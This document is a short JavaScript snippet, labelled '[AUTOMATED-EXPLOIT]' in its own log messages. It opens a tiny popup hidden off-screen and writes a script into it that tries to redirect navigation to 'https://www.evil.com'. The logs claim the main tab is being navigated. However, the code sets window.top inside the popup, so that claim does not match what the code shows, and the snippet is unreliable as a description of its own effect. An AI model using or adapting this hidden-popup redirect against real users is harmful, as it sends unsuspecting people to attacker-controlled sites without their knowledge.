(function() {
  console.log("[AUTOMATED-EXPLOIT] Starting...");

  try {
    const newWin = window.open('', '_blank', 'width=100,height=100,left=9999,top=9999');
    
    if (!newWin) {
      throw new Error("Popup window was blocked. Please allow popups for this to work.");
    }

    newWin.document.write(`
      <!DOCTYPE html>
      <html>
        <head><title>Navigating...</title></head>
        <body>
          <p>Navigating main window...</p>
          <script>
            window.onload = function() {
              try {
                window.top.location.href = "https://www.evil.com";
              } catch (e ) {

                document.body.innerHTML = "Failed: " + e.message;
              }
            };
          <\/script>
        </body>
      </html>
    `);

    newWin.document.close();

    console.log("[AUTOMATED-EXPLOIT] Popup opened and navigation command sent. The main tab should now be navigating.");

  } catch (e) {
    console.error("[AUTOMATED-EXPLOIT] Failed to execute:", e);
    alert("Exploit failed: " + e.message);
  }
})();
